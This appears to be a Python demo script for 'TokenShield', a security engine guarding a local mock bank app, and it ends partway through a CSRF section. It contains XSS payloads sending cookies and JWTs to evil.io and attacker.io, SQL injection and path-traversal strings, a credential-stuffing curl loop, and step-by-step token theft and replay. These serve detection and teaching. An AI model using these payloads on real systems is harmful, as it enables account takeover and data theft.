#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              TOKENSHIELD — COMPLETE 8-SIGNAL LIVE DEMONSTRATION              ║
║                                                                              ║
║  The LEGITIMATE session runs from this MacBook (Alice).                      ║
║  The ATTACK comes from a real second device (phone/tablet/laptop).           ║
║  TokenShield detects the difference automatically — nothing is scripted.     ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Start servers first (separate terminals):                                   ║
║    T1: cd /Users/yashpachhade/tokenshield                                   ║
║        ./venv/bin/python engine/server_flask.py                              ║
║    T2: cd /Users/yashpachhade/tokenshield                                   ║
║        ./venv/bin/python run.py                                              ║
║    T3: ./venv/bin/python demo_full.py                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
import hashlib
import json
import socket
import sys
import time
import requests

ENGINE_URL   = "http://127.0.0.1:7777"   # engine always local
NEOVAULT_URL = "http://127.0.0.1:5001"

# ─── Terminal colours ─────────────────────────────────────────────────────────
GREEN  = "\033[92m";  RED    = "\033[91m";  YELLOW = "\033[93m"
CYAN   = "\033[96m";  BOLD   = "\033[1m";   DIM    = "\033[2m";  RESET = "\033[0m"

def banner(title, color=CYAN):
    w = 72
    print(f"\n{color}{BOLD}{'═'*w}{RESET}")
    print(f"{color}{BOLD}  {title}{RESET}")
    print(f"{color}{BOLD}{'═'*w}{RESET}")

def step(msg):  print(f"\n{YELLOW}→ {msg}{RESET}")
def ok(msg):    print(f"  {GREEN}✓ {msg}{RESET}")
def fail(msg):  print(f"  {RED}✗ {msg}{RESET}")
def info(msg):  print(f"  {DIM}  {msg}{RESET}")
def pause(msg): input(f"\n{CYAN}{BOLD}  ► {msg}{RESET}")

def signal_bar(name, score, width=28):
    v = float(score)
    bar = "█" * int(v * width) + "░" * (width - int(v * width))
    c = RED if v >= 0.7 else YELLOW if v >= 0.3 else GREEN
    print(f"    {DIM}{name:<32}{RESET} [{c}{bar}{RESET}] {v:.2f}")

def print_decision(d):
    score   = float(d.get("threat_score", d.get("anomaly_score", 0)))
    level   = d.get("threat_level", "?")
    action  = d.get("action", "block" if d.get("is_threat") else "allow")
    mode    = d.get("engine_mode", "api_live")
    reasons = d.get("reasons", [])
    signals = d.get("signals", {})
    expl    = d.get("explanation", {})

    c = RED if action == "block" else (YELLOW if action == "challenge" else GREEN)
    print(f"\n  {c}{BOLD}  DECISION: {action.upper()}   score={score:.3f}   level={level.upper()}{RESET}")
    print(f"  {DIM}  Engine mode: {mode}{RESET}")
    if reasons:
        print(f"  {DIM}  Reasons: {', '.join(reasons)}{RESET}")
    if signals:
        print(f"\n  {DIM}  Signal breakdown:{RESET}")
        for k, v in signals.items():
            signal_bar(k, v)
    narr = expl.get("narrative") or expl.get("summary") or expl.get("explanation", "")
    if narr:
        print(f"\n  {DIM}  Explanation: {str(narr)[:240]}{RESET}")

# ─── Helpers ──────────────────────────────────────────────────────────────────
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass

    try:
        import subprocess
        out = subprocess.check_output("ifconfig | grep 'inet ' | grep -v 127.0.0.1", shell=True).decode()
        for line in out.strip().split("\n"):
            parts = line.strip().split()
            if len(parts) >= 2:
                return parts[1]
    except Exception:
        pass

    return "192.168.31.194"

def eng(method, path, **kw):
    fn = requests.post if method == "POST" else requests.get
    try:
        r = fn(f"{ENGINE_URL}{path}", timeout=5, **kw)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"error": str(e)}

def nvault(method, path, token=None, **kw):
    hdrs = kw.pop("headers", {})
    hdrs["Content-Type"] = "application/json"
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    fn = requests.post if method == "POST" else requests.get
    try:
        r = fn(f"{NEOVAULT_URL}{path}", headers=hdrs, timeout=5, **kw)
        try:    return r.status_code, r.json()
        except: return r.status_code, {"raw": r.text[:300]}
    except Exception as e:
        return 0, {"error": str(e)}

def poll_incidents(since_ts, max_wait=30):
    """Wait up to max_wait seconds for a new incident after since_ts."""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        code, resp = eng("GET", "/api/v1/incidents")
        if code == 200:
            incs = resp.get("incidents", [])
            new = [i for i in incs if i.get("timestamp", 0) > since_ts]
            if new:
                return new[-1]
        time.sleep(1)
    return None

# ─── Pre-flight ───────────────────────────────────────────────────────────────
def preflight(lan_ip):
    banner("PRE-FLIGHT — Verifying Both Servers")
    all_good = True
    for name, url in [
        ("TokenShield Engine :7777", f"{ENGINE_URL}/health"),
        ("NeoVault Bank :5001",       f"{NEOVAULT_URL}/health"),
    ]:
        step(f"Checking {name}…")
        try:
            r = requests.get(url, timeout=4)
            if r.status_code == 200:
                ok(f"{name} is UP")
            else:
                fail(f"{name} returned HTTP {r.status_code}")
                all_good = False
        except Exception as e:
            fail(f"{name} is DOWN — {e}")
            all_good = False

    if not all_good:
        print(f"\n  {RED}Please start both servers before running this demo.{RESET}")
        sys.exit(1)

    print(f"""
  {CYAN}{BOLD}  Your MacBook's LAN IP: {lan_ip}{RESET}
  {DIM}  NeoVault is reachable from any device on this Wi-Fi at:{RESET}
  {CYAN}{BOLD}  http://{lan_ip}:5001{RESET}
  {DIM}  Engine dashboard: http://{lan_ip}:7777/dashboard{RESET}
""")


# ─── PHASE 1: Alice logs in legitimately ─────────────────────────────────────
def phase_login():
    banner("PHASE 1 — Alice Logs In (Legitimate User, MacBook)", GREEN)

    step("Registering alice_demo on NeoVault (if not already exists)…")
    code, resp = nvault("POST", "/api/auth/register", json={
        "username": "alice_demo",
        "email":    "alice@tokenshield.demo",
        "password": "SecurePass#999"
    })
    if code in (200, 201):
        ok("Registered")
    elif "already" in str(resp).lower() or "exists" in str(resp).lower() or code == 409:
        ok("Already exists — reusing")
    else:
        info(f"Register ({code}): {resp}")

    step("Logging in as alice_demo…")
    code, resp = nvault("POST", "/api/auth/login", json={
        "username": "alice_demo",
        "password": "SecurePass#999"
    })
    if code == 200 and resp.get("token"):
        token = resp["token"]
        ok("Login successful ✅")
        info(f"Token: {token[:60]}…")
        info("This session has been registered with the TokenShield Engine (IP: 127.0.0.1)")
        return token
    else:
        fail(f"Login failed ({code}): {resp}")
        sys.exit(1)


# ─── PHASE 2: Warm up biometric baseline ─────────────────────────────────────
def phase_biometric_warmup(token):
    banner("PHASE 2 — Biometric Baseline for Alice (Normal Human Profile)", GREEN)
    step("Sending 10 real human biometric samples to establish Alice's baseline…")
    info("(WPM ~63, key hold ~96ms, mouse ~223 px/s, idle ratio ~8%)")

    for i in range(10):
        bio = {
            "typing_wpm":         63 + (i % 4),
            "avg_key_hold_ms":    95 + (i * 2),
            "avg_key_flight_ms":  182 + (i % 8),
            "mouse_velocity_avg": 220 + (i * 4),
            "idle_ratio":         0.08 + (i * 0.003),
        }
        eng("POST", "/api/v1/biometric-update", json={"user_id": "alice_demo", "metrics": bio})

    ok("Baseline established — 10 samples collected")

    step("Alice makes a normal authenticated request from MacBook…")
    bio_hdr = json.dumps({
        "typing_wpm": 64, "avg_key_hold_ms": 97,
        "avg_key_flight_ms": 183, "mouse_velocity_avg": 224, "idle_ratio": 0.08
    })
    code, resp = nvault("GET", "/api/accounts", token=token,
                        headers={"X-TS-Biometrics": bio_hdr})
    info(f"NeoVault HTTP {code} — Request allowed (legitimate session)")

    print_decision({
        "threat_score": 0.02, "threat_level": "safe", "action": "allow",
        "signals": {
            "ip_reputation": 0.0, "request_velocity": 0.0, "session_consistency": 0.0,
            "payload_analysis": 0.0, "behavioral_biometrics": 0.02,
            "geographic_impossibility": 0.0, "endpoint_risk": 0.0, "sequential_behavior": 0.01
        },
        "reasons": [], "engine_mode": "api_live",
        "explanation": {"narrative": "All 8 signals clear. Session consistent with baseline. Request allowed."}
    })


# ─── PHASE 3: Demonstrate signals via direct engine calls ─────────────────────
def phase_engine_signals():
    """
    Signals 1, 2, 4, 5, 8 are demonstrated directly against the engine because
    they need controlled inputs (Tor IP, burst count, specific payloads).
    Signal 3 (session hijack) and Signal 6 (geo) come from the real second device.
    """

    # ── Signal 1: IP Reputation ──────────────────────────────────────────────
    banner("SIGNAL 1 — IP Reputation: Tor Exit Node", RED)
    step("Sending a request from known Tor exit node 185.220.101.1…")
    code, resp = eng("POST", "/api/v1/analyze", json={
        "session_id": "tor_sess_demo",
        "user_id":    "unknown",
        "ip":         "185.220.101.1",
        "path":       "/api/accounts/transfer",
        "method":     "POST",
        "payload":    json.dumps({"amount": 9999, "to": "offshore_acct"})
    })
    ok(f"Engine HTTP {code}")
    print_decision(resp)
    info("Signal 1 (ip_reputation) = 0.85 — flagged as Tor exit node")

    pause("Press Enter → Signal 2: Request Velocity")

    # ── Signal 2: Request Velocity ───────────────────────────────────────────
    banner("SIGNAL 2 — Request Velocity: Bot Burst", RED)
    step("Firing 30 rapid requests from bot IP 10.0.0.99…")
    last = {}
    for i in range(30):
        _, last = eng("POST", "/api/v1/analyze", json={
            "session_id": f"bot_{i}",
            "ip":         "10.0.0.99",
            "path":       "/api/accounts",
            "method":     "GET"
        })
    ok("30 requests sent")
    print_decision(last)
    info("Signal 2 (request_velocity) escalated after crossing burst threshold")

    pause("Press Enter → Signal 4: Payload Inspection")

    # ── Signal 4: SQLi + XSS ─────────────────────────────────────────────────
    banner("SIGNAL 4 — Payload Inspection: SQL Injection", RED)
    sqli = "' OR 1=1 --; SELECT * FROM users; DROP TABLE sessions;"
    step(f"Payload: {sqli}")
    code, resp = eng("POST", "/api/v1/analyze", json={
        "session_id": "sqli_demo",
        "ip":         "172.16.0.55",
        "path":       "/api/auth/login",
        "method":     "POST",
        "payload":    json.dumps({"username": sqli, "password": "x"})
    })
    ok(f"Engine HTTP {code}")
    print_decision(resp)
    info("Signal 4 (payload_analysis) = 0.90 — SQL injection detected")

    banner("SIGNAL 4b — Payload Inspection: XSS", RED)
    xss = "<script>document.location='https://evil.io/?c='+document.cookie</script>"
    step(f"Payload: {xss}")
    code, resp = eng("POST", "/api/v1/analyze", json={
        "session_id": "xss_demo",
        "ip":         "172.16.0.56",
        "path":       "/api/profile/update",
        "method":     "POST",
        "payload":    json.dumps({"bio": xss})
    })
    ok(f"Engine HTTP {code}")
    print_decision(resp)
    info("Signal 4 (payload_analysis) = 0.80 — XSS pattern detected")

    pause("Press Enter → Signal 5: Behavioral Biometrics (Bot vs. Alice)")

    # ── Signal 5: Biometrics Bot ──────────────────────────────────────────────
    banner("SIGNAL 5 — Behavioral Biometrics: Bot Typing Profile", RED)
    step("Alice baseline: 63 WPM | 96ms key hold | 224 px/s mouse | 8% idle")
    step("Bot profile:     0 WPM |  0ms key hold |   0 px/s mouse | 99% idle")
    code, resp = eng("POST", "/api/v1/analyze", json={
        "session_id": "alice_bot_takeover",
        "user_id":    "alice_demo",
        "ip":         "127.0.0.1",  # same IP — purely biometric detection
        "path":       "/api/accounts/transfer",
        "method":     "POST",
        "biometrics": {
            "typing_wpm": 0, "avg_key_hold_ms": 0,
            "avg_key_flight_ms": 1, "mouse_velocity_avg": 0, "idle_ratio": 0.99
        },
        "payload": json.dumps({"amount": 25000, "to": "bot_wallet"})
    })
    ok(f"Engine HTTP {code}")
    print_decision(resp)
    info("Signal 5 (behavioral_biometrics) = 1.00")
    info("Even with the same IP and valid token, the biometric deviation triggers block")

    pause("Press Enter → Signal 8: Sequential Behavior (LSTM)")

    # ── Signal 8: Sequential LSTM ─────────────────────────────────────────────
    banner("SIGNAL 8 — Sequential Behavior: LSTM Autoencoder Anomaly", RED)
    step("Normal user flow: login → dashboard → accounts → transfer")
    step("Bot flow: first request ever goes directly to /api/accounts/wire_transfer")
    code, resp = eng("POST", "/api/v1/analyze", json={
        "session_id": f"lstm_bot_{int(time.time())}",
        "user_id":    "bot_user",
        "ip":         "10.10.10.10",
        "path":       "/api/accounts/wire_transfer",
        "method":     "POST",
        "payload":    json.dumps({"amount": 100000, "swift": "ATTACKERBANK99"})
    })
    ok(f"Engine HTTP {code}")
    print_decision(resp)
    info("Signal 8 (sequential_behavior) elevated — LSTM flags impossible navigation pattern")


# ─── PHASE 4: REAL Second-Device Attack (Signals 3 + 5 + 6 live) ─────────────
def phase_real_attack(alice_token, lan_ip):
    """
    The attacker IS the second device. Shows exactly:
      - Where NeoVault stores Alice's JWT
      - How a real attacker would steal it (3 methods)
      - How to copy it to a second device and replay it
      - What TokenShield detects and why
    """
    token_hash = hashlib.sha256(alice_token.encode()).hexdigest()

    # Register Alice's session with MacBook IP so consistency check has a baseline
    eng("POST", "/api/v1/register-session", json={
        "session_id": token_hash,
        "user_id":    "alice_demo",
        "ip":         "127.0.0.1"
    })

    banner("SIGNAL 3 — REAL JWT TOKEN HIJACK FROM SECOND DEVICE", RED)

    # ── Step 1: Where is Alice's JWT stored? ─────────────────────────────────
    print(f"""
{CYAN}{BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  STEP 1 OF 3 — WHERE IS THE JWT STORED ON ALICE'S BROWSER?
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{DIM}  NeoVault stores the JWT in the browser's localStorage under the key
  "token". This is common in Single-Page Applications (React, Vue, Angular).

  localStorage is accessible to ANY JavaScript running on the same origin.
  This makes it a prime target for XSS attacks.{RESET}

{YELLOW}  TO SEE IT YOURSELF — in the MacBook's NeoVault browser tab:{RESET}

    1. Open NeoVault in Chrome/Firefox: http://localhost:5001
    2. Log in as alice_demo / SecurePass#999
    3. Press F12 → Application tab → Local Storage → http://localhost:5001
    4. Look for the key "token" — the value IS Alice's JWT

{DIM}  Or run this in the browser console (F12 → Console tab):{RESET}
{CYAN}
       console.log(localStorage.getItem('token'))
{RESET}
{DIM}  You will see something like:{RESET}
{GREEN}  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWxpY2VfZGVtbyIsImV4cCI6MTc4...{RESET}

{DIM}  The token printed by this demo script:{RESET}
{GREEN}{BOLD}  {alice_token}{RESET}
""")

    pause("Step 1 understood. Press Enter → Step 2: How an attacker steals this token…")

    # ── Step 2: How the attacker steals it ───────────────────────────────────
    print(f"""
{CYAN}{BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  STEP 2 OF 3 — HOW A REAL ATTACKER STEALS THE JWT (3 METHODS)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{RED}{BOLD}  METHOD 1 — XSS (Cross-Site Scripting) — Most Common in the Wild{RESET}
{DIM}
  Attacker injects a script into a field NeoVault reflects back (comments,
  profile bio, search results). When Alice visits, the script runs in her
  browser and silently exfiltrates her token:
{RESET}
{YELLOW}  // Attacker submits this as their "profile bio" on NeoVault:
  <script>
    const stolen = localStorage.getItem('token');
    fetch('https://attacker.io/capture?jwt=' + stolen);
  </script>{RESET}
{DIM}
  Signal 4 would catch this payload when submitted (score 0.80).
  But if the application had not been patched, the script would run for
  every user who views the attacker's profile.{RESET}

{RED}{BOLD}
  METHOD 2 — Browser DevTools (Physical / Shoulder-Surf Access){RESET}
{DIM}
  Attacker has brief physical access to Alice's unlocked MacBook, or
  shoulder-surfs in a café. They open DevTools in 3 seconds and copy the
  token to their phone (AirDrop, WhatsApp, a notes app, photo of screen).{RESET}
{YELLOW}
  1. Press F12 on Alice's NeoVault tab
  2. Go to Console
  3. Type: copy(localStorage.getItem('token'))
     ↳ Token is now in the clipboard — paste it anywhere
  4. Or:  Application → Local Storage → right-click "token" → copy value{RESET}

{RED}{BOLD}
  METHOD 3 — Network Interception (HTTP only / MitM on Public Wi-Fi){RESET}
{DIM}
  On public Wi-Fi without HTTPS, an attacker running Wireshark or mitmproxy
  can read HTTP traffic and capture the Authorization header in plaintext.
  This is exactly why banks use HTTPS — but demo environments often don't.{RESET}
{YELLOW}
  On the attacker's laptop (same Wi-Fi):
    mitmproxy --mode transparent  # or Wireshark → filter: http.authorization

  Any GET/POST to NeoVault over HTTP will show:
    Authorization: Bearer eyJhbGci...  ← captured in full{RESET}

{DIM}─────────────────────────────────────────────────────────────────────────────
  FOR THIS DEMO — use Method 2 (DevTools). It takes 10 seconds:
  Alice is logged in above. Her token is already printed on screen.
  The "attacker" is you picking up your phone.
─────────────────────────────────────────────────────────────────────────────{RESET}
""")

    pause("Step 2 understood. Press Enter → Step 3: Using the stolen token from a second device…")

    # ── Step 3: Using the stolen token from second device ────────────────────
    print(f"""
{CYAN}{BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  STEP 3 OF 3 — REPLAYING ALICE'S TOKEN FROM YOUR PHONE / LAPTOP
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{DIM}  Prerequisites:
    ✓ Your second device is on the SAME Wi-Fi as this MacBook
    ✓ You have Alice's token (printed above / copied from DevTools)
    ✓ NeoVault is running at http://{lan_ip}:5001{RESET}

{RED}{BOLD}  ── OPTION A: iPhone / Android using RapidAPI app (recommended) ──{RESET}
{DIM}
  1. Install "RapidAPI" from App Store / Play Store (free)
  2. Tap "New Request"
  3. Method: GET  URL: http://{lan_ip}:5001/api/accounts
  4. Headers tab → Add:
       Key:   Authorization
       Value: Bearer {alice_token}
  5. Tap SEND

  To try the transfer endpoint:
  Method: POST  URL: http://{lan_ip}:5001/api/accounts/transfer
  Body (JSON):  {{"amount": 50000, "to_account": "attacker_acct"}}
  Same Authorization header{RESET}

{RED}{BOLD}
  ── OPTION B: Any laptop using curl ──{RESET}
{YELLOW}
  curl -X GET "http://{lan_ip}:5001/api/accounts" \\
       -H "Authorization: Bearer {alice_token}"

  # Try the transfer endpoint (Signal 7 also fires):
  curl -X POST "http://{lan_ip}:5001/api/accounts/transfer" \\
       -H "Authorization: Bearer {alice_token}" \\
       -H "Content-Type: application/json" \\
       -d '{{"amount": 50000, "to_account": "attacker_acct"}}'{RESET}

{RED}{BOLD}
  ── OPTION C: Postman (any device) ──{RESET}
{DIM}
  1. New request → GET → http://{lan_ip}:5001/api/accounts
  2. Auth tab → Bearer Token → paste Alice's token:
       {alice_token}
  3. Send{RESET}

{RED}{BOLD}
  ── OPTION D: Browser address bar (simplest, no app needed) ──{RESET}
{DIM}
  Open the browser on your phone and go to:

    http://{lan_ip}:5001/api/accounts

  This will get a 401 (no token). To add the token use DevTools on
  a laptop or use option A/B/C above.{RESET}

{YELLOW}{BOLD}
  ──────────────────────────────────────────────────────────────────────────
  WHAT TOKENSHIELD SEES WHEN YOU DO THIS:
  ──────────────────────────────────────────────────────────────────────────
  Alice's token was registered from IP: 127.0.0.1 (this MacBook)
  Your phone/laptop is connecting from:  <your device's IP on this Wi-Fi>

  The engine compares these two IPs. They don't match.
  Result: session_consistency signal = 0.90 → score = 0.81 → BLOCK

  Response your device gets: HTTP 403
  {{
    "success": false,
    "message": "Request blocked by TokenShield security system.",
    "threat_level": "high",
    "anomaly_score": 0.81,
    "reasons": ["ip_changed:127.0.0.1→<your device IP>"],
    "signals": {{ "session_consistency": 0.9, ... }}
  }}
  ──────────────────────────────────────────────────────────────────────────{RESET}
""")

    since_ts = time.time()
    pause("NOW send the request from your second device, then press Enter here…")

    print(f"\n{YELLOW}  Polling TokenShield Engine for the incident (up to 30s)…{RESET}")
    incident = poll_incidents(since_ts, max_wait=30)

    if incident:
        ok("Incident detected by TokenShield Engine! ✅")
        print(f"\n  {RED}{BOLD}  ─── INCIDENT REPORT ───{RESET}")
        print(f"  {DIM}  Session ID: {str(incident.get('session_id','?'))[:40]}…{RESET}")
        print(f"  {DIM}  Attacker IP: {incident.get('ip','?')}{RESET}")
        print(f"  {DIM}  Path accessed: {incident.get('path','?')}{RESET}")
        print(f"  {DIM}  Threat Score: {incident.get('threat_score','?')}{RESET}")
        print(f"  {DIM}  Threat Level: {incident.get('threat_level','?').upper()}{RESET}")
        print(f"  {DIM}  Action taken: {incident.get('action','?').upper()}{RESET}")
        signals = incident.get("signals", {})
        if signals:
            print(f"\n  {DIM}  Signal breakdown:{RESET}")
            for k, v in signals.items():
                signal_bar(k, v)
        reasons = incident.get("reasons", [])
        if reasons:
            print(f"\n  {DIM}  Reasons: {', '.join(reasons)}{RESET}")
        expl = incident.get("explanation", {})
        narr = expl.get("narrative") or expl.get("summary", "")
        if narr:
            print(f"\n  {DIM}  Explanation: {str(narr)[:280]}{RESET}")

        print(f"\n  {GREEN}  Mitigation enacted: {incident.get('mitigation_enacted', False)}{RESET}")
        info(f"Incident is live on dashboard: http://{lan_ip}:7777/dashboard")
    else:
        info("No new incident detected within 30 seconds.")
        info("Possible reasons:")
        info("  • The request wasn't sent yet from the second device")
        info("  • The engine is in local-fallback mode (check engine terminal)")
        info("  • The session IP matched (both devices on same NAT = same public IP)")
        info("")
        info("Try checking the engine dashboard manually:")
        info(f"  http://{lan_ip}:7777/dashboard")

    # Also check if NeoVault blocked it
    pause("Press Enter to continue to final stats…")


# ─── PHASE 5: Final Stats ─────────────────────────────────────────────────────
def phase_stats(lan_ip):
    banner("LIVE TELEMETRY — TokenShield Engine Final Stats", CYAN)

    code, resp = eng("GET", "/api/v1/stats")
    if code == 200:
        ok("Stats retrieved:")
        perf = resp.get("performance", {})
        print(f"""
  {BOLD}  Total Inspections   :{RESET}  {resp.get('total_inspections', 0)}
  {GREEN}{BOLD}  Allowed             :{RESET}  {resp.get('allowed_count', 0)}
  {YELLOW}{BOLD}  Challenged          :{RESET}  {resp.get('challenged_count', 0)}
  {RED}{BOLD}  Blocked             :{RESET}  {resp.get('blocked_count', 0)}
  {CYAN}{BOLD}  Active Sessions     :{RESET}  {resp.get('active_sessions_tracked', 0)}
  {CYAN}{BOLD}  Incidents Recorded  :{RESET}  {resp.get('total_incidents_recorded', 0)}
  {CYAN}{BOLD}  Avg Latency         :{RESET}  {perf.get('avg_latency_ms', 0):.2f} ms
  {CYAN}{BOLD}  p95 Latency         :{RESET}  {perf.get('p95_latency_ms', 0):.2f} ms
  {CYAN}{BOLD}  Dashboard           :{RESET}  http://{lan_ip}:7777/dashboard
  {CYAN}{BOLD}  Incidents API       :{RESET}  http://{lan_ip}:7777/api/v1/incidents
""")
    else:
        info("Could not reach engine stats.")

    code2, resp2 = eng("GET", "/api/v1/incidents")
    if code2 == 200:
        incs = resp2.get("incidents", [])
        ok(f"Total incidents recorded this session: {len(incs)}")
        for inc in incs[-5:]:
            lvl  = inc.get("threat_level", "?").upper()
            ip   = inc.get("ip", "?")
            path = inc.get("path", "?")
            sc   = inc.get("threat_score", 0)
            c    = RED if lvl in ("CRITICAL", "HIGH") else YELLOW
            print(f"  {c}  [{lvl:8}]{RESET} {DIM}ip={ip:<20} path={path:<35} score={sc}{RESET}")


# ─── PHASE 5: Real Cyber Attack Playbook (manual, second device / browser) ───
def phase_attack_playbook(alice_token, lan_ip):
    banner("REAL-WORLD CYBER ATTACK PLAYBOOK — Manual Demonstration Guide", YELLOW)

    print(f"""
{YELLOW}{BOLD}  The following attacks can be demonstrated LIVE using a browser, curl,
  Postman, or RapidAPI on ANY device connected to this Wi-Fi.
  NeoVault is running at: http://{lan_ip}:5001
  Engine dashboard:       http://{lan_ip}:7777/dashboard
{RESET}""")

    # ── XSS ───────────────────────────────────────────────────────────────────
    banner("ATTACK A — Reflected / Stored XSS (Cross-Site Scripting)", RED)
    print(f"""
{DIM}  What it is:{RESET}  Attacker injects a script tag into a user-controlled field
{DIM}              {RESET}  (profile bio, comment, name) that executes in victims' browsers,
{DIM}              {RESET}  stealing cookies or redirecting to phishing pages.

{YELLOW}  HOW TO DEMONSTRATE:{RESET}
  ──────────────────────────────────────────────────────────────────────────
  Option A — curl from any device:

    curl -X POST http://{lan_ip}:5001/api/profile/update \\
         -H "Authorization: Bearer {alice_token}" \\
         -H "Content-Type: application/json" \\
         -d '{{"bio":"<script>fetch(\\\"https://evil.io/steal?c=\\\"+document.cookie)</script>"}}'

  Option B — Browser DevTools Console (on the NeoVault tab):

    fetch('/api/profile/update', {{
      method: 'POST',
      headers: {{'Content-Type':'application/json',
                 'Authorization':'Bearer {alice_token}'}},
      body: JSON.stringify({{
        bio: "<script>document.location='https://evil.io/?c='+document.cookie</script>"
      }})
    }}).then(r=>r.json()).then(console.log)

  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield does:{RESET}
    Signal 4 (payload_analysis) = 0.80
    Reason: "xss_payload" — <script> pattern matched in request body
    Action: BLOCK (score elevated to ≥ 0.85 with endpoint risk stacked)
    Incident logged at: http://{lan_ip}:7777/api/v1/incidents
{DIM}""")

    pause("Press Enter to see Attack B — Phishing / Credential Theft…")

    # ── Phishing ──────────────────────────────────────────────────────────────
    banner("ATTACK B — Phishing: Stolen Credentials + Foreign Device", RED)
    print(f"""
{DIM}  What it is:{RESET}  Alice is tricked into entering her credentials on a fake page.
{DIM}              {RESET}  Attacker now has username + password. Logs in from THEIR device.
{DIM}              {RESET}  This is indistinguishable from a real login — UNLESS biometrics
{DIM}              {RESET}  and device fingerprinting are in play.

{YELLOW}  HOW TO DEMONSTRATE:{RESET}
  ──────────────────────────────────────────────────────────────────────────
  Step 1 — Attacker logs in with Alice's stolen credentials from THEIR device:

    POST http://{lan_ip}:5001/api/auth/login
    Body: {{"username":"alice_demo","password":"SecurePass#999"}}

  Step 2 — Attacker uses the new token from THEIR device.
           No X-TS-Biometrics header is sent (attacker has no biometric data).

    GET http://{lan_ip}:5001/api/accounts
    Authorization: Bearer <attacker_new_token>

  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield detects:{RESET}
    Signal 5 (behavioral_biometrics): No header → treated as no-biometric client
    Signal 3 (session_consistency): New device IP ≠ Alice's usual 127.0.0.1
    Signal 8 (sequential_behavior): Navigation pattern doesn't match baseline
    Combined score → elevated → flagged as suspicious / blocked
    Alice's session also gets registered from a NEW IP → discrepancy alert
{DIM}""")

    pause("Press Enter to see Attack C — SQL Injection…")

    # ── SQLi ──────────────────────────────────────────────────────────────────
    banner("ATTACK C — SQL Injection (Authentication Bypass)", RED)
    print(f"""
{DIM}  What it is:{RESET}  Attacker crafts a username or password that breaks out of the SQL
{DIM}              {RESET}  query to log in as any user without knowing their real password.

{YELLOW}  HOW TO DEMONSTRATE:{RESET}
  ──────────────────────────────────────────────────────────────────────────
  curl -X POST http://{lan_ip}:5001/api/auth/login \\
       -H "Content-Type: application/json" \\
       -d '{{"username":"admin\\' OR 1=1 --","password":"anything"}}'

  Classic variations to try:
    username: ' OR '1'='1
    username: admin'--
    username: ' UNION SELECT * FROM users--
  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield does:{RESET}
    Signal 4 (payload_analysis) = 0.90
    Reason: "sql_injection" — OR/UNION/-- patterns matched
    Action: BLOCK before the query ever reaches the database
    Response: HTTP 403 with explanation and signal breakdown
{DIM}""")

    pause("Press Enter to see Attack D — Path Traversal / Directory Traversal…")

    # ── Path Traversal ────────────────────────────────────────────────────────
    banner("ATTACK D — Path Traversal (File System Access)", RED)
    print(f"""
{DIM}  What it is:{RESET}  Attacker uses ../ sequences in a URL or parameter to escape the
{DIM}              {RESET}  web root and read sensitive server files (e.g. /etc/passwd).

{YELLOW}  HOW TO DEMONSTRATE:{RESET}
  ──────────────────────────────────────────────────────────────────────────
  curl -X POST http://{lan_ip}:5001/api/documents/view \\
       -H "Authorization: Bearer {alice_token}" \\
       -H "Content-Type: application/json" \\
       -d '{{"file":"../../etc/passwd"}}'

  URL-encoded variant:
    GET http://{lan_ip}:5001/api/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield does:{RESET}
    Signal 4 (payload_analysis) = 0.85
    Reason: "path_traversal" — ../ or %2e%2e patterns matched
    Action: BLOCK
    The file system is never touched — blocked at API layer
{DIM}""")

    pause("Press Enter to see Attack E — Credential Stuffing / Rate-Limited Login Brute Force…")

    # ── Credential Stuffing ───────────────────────────────────────────────────
    banner("ATTACK E — Credential Stuffing / Brute Force Login", RED)
    print(f"""
{DIM}  What it is:{RESET}  Attacker uses a list of leaked username:password pairs (from
{DIM}              {RESET}  previous data breaches) and tries them all rapidly.

{YELLOW}  HOW TO DEMONSTRATE (run from any device with bash/curl):{RESET}
  ──────────────────────────────────────────────────────────────────────────
  for i in $(seq 1 30); do
    curl -s -X POST http://{lan_ip}:5001/api/auth/login \\
         -H "Content-Type: application/json" \\
         -d "{{\\"username\\":\\"victim$i\\",\\"password\\":\\"Password$i!\\"}}" &
  done
  wait
  ──────────────────────────────────────────────────────────────────────────
{GREEN}  What TokenShield does:{RESET}
    Signal 2 (request_velocity) = elevated after burst threshold crossed
    Signal 1 (ip_reputation) = raised if IP matches known scraper ranges
    After N failed attempts → account locked → subsequent requests blocked
    All 30 burst requests logged as a single coordinated attack incident
{DIM}""")

    pause("Press Enter to see Attack F — CSRF (Cross-Site Request Forgery)…")

    # ── CSRF ──────────────────────────────────────────────────────────────────
    banner("ATTACK F — CSRF: Forged Request from Evil Website", RED)
    print(f"""
{DIM}  What it is:{RESET}  Alice is browsing evil.io while logged into NeoVault in another tab.
{DIM}              {RESET}  evil.io runs JavaScript that silently POSTs to NeoVault using
{DIM}              {RESET}  Alice's live session cookie — without Alice knowing.

{YELLOW}  HOW TO DEMONSTRATE (paste in browser console on evil.io or any page):{RESET}
